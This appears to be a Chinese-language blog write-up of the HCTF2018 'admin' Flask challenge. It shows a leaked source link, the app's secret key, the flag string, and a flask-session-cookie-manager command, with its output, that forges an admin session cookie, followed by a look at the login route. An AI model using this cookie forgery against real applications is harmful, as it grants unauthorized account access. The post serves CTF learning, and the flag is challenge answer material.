---
title: 'python审计之flask'
date: 2019-10-10
updated: 2019-10-11
category: 'web'
tags:
  - 'python'
  - 'flask'
lang: 'zh'
draft: false
---
菜鸡决定对python审计好好复习一下

## HCTF2018 admin

### 复现

虽然是非预期解但是也很有趣，师傅写的代码也挺棒的

在修改密码的页面查看源代码发现了一个提示。(不过这个挺难发现的还是要养成多看看源码的习惯)

```html

<div class="ui grid">
    <div class="four wide column"></div>
    <div class="eight wide column">
        <!-- https://github.com/woadsl1234/hctf_flask/ -->
      <form class="ui form segment" method="post" enctype="multipart/form-data">
        <div class="field required">
          <label>NewPassword</label>
          <input id="newpassword" name="newpassword" required type="password" value="">
        </div>
        <input type="submit" class="ui button fluid" value="更换密码">
      </form>
```

之后就可以看到`flask`的`secret_key`是`ckj123`

同时可以看到`flag`获得的条件

```html
{% if current_user.is_authenticated and session['name'] == 'admin' %}
<h1 class="nav">hctf{un1c0dE_cHe4t_1s_FuNnying}</h1>
{% endif %}
```

然后就可以伪造session了，抓包后修改session就可以了(Windows的python3跑不了用的WSL中的python3)

```
flask-session-cookie-manager git:(master) python3 session_cookie_manager.py encode -s 'ckj123' -t '{"name":"admin", "user_id":"1"}'
eyJuYW1lIjoiYWRtaW4iLCJ1c2VyX2lkIjoiMSJ9.XZ9J5Q.mDSLo4JaAJRZVahOGaLqKCuswD8
```

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/flask.png)

### 分析一下源码

app目录主要内容，其中`code.py`是用来产生验证码的，`config.py`是配置文件，`forms.py`是表单建模，`models.py`是一些模型，`routers.py`是路由

```
├── app
│   ├── __init__.py
│   ├── __init__.pyc
│   ├── code.py
│   ├── code.pyc
│   ├── config.py
│   ├── config.pyc
│   ├── forms.py
│   ├── forms.pyc
│   ├── models.py
│   ├── models.pyc
│   ├── routes.py
│   ├── routes.pyc
│   ├── static
│   └── templates
```

我们拿到flag的条件就是登陆`admin`用户，登陆的路由如下：

```python
@app.route('/login', methods = ['GET', 'POST'])
def login():
    # TODO: 此处current_user是什么意思？它是从flask_login中导入的
    if current_user.is_authenticated:
        return redirect(url_for('index'))

    form = LoginForm()
    if request.method == 'POST':
        name = strlower(form.username.data) #从表单中获取到name然后存入session中
        session['name'] = name
        user = User.query.filter_by(username=name).first()
        if user is None or not user.check_password(form.password.data):
            flash('Invalid username or password')
            return redirect(url_for('login'))
        login_user(user, remember=form.remember_me.data)
        return redirect(url_for('index'))
    return render_template('login.html', title = 'login', form = form)
```

这里涉及到了`flask`的用户认证可以学习一下，令人疑惑的是文档中说了这个`is_authenticated`方法需要自己实现，但是我并没有在源代码中找到实现了这个方法。

[参考文档](http://www.pythondoc.com/flask-login/)
